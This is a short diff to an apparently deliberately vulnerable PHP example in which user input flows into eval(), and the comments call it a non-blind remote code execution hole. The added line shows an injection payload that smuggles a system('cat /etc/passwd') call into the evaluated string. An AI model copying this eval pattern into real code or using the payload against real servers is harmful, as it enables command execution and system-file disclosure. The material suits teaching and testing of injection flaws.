@@ -10,3 +10,5 @@ $empty = 'No variable given';
 // vulnerable to Remote Code Execution (rce). This RCE
 // is NOT blind.
 eval('echo $' . $variable . ';');
+
+"';system('cat /etc/passwd');//" --> echo $';system('cat /etc/passwd');//;
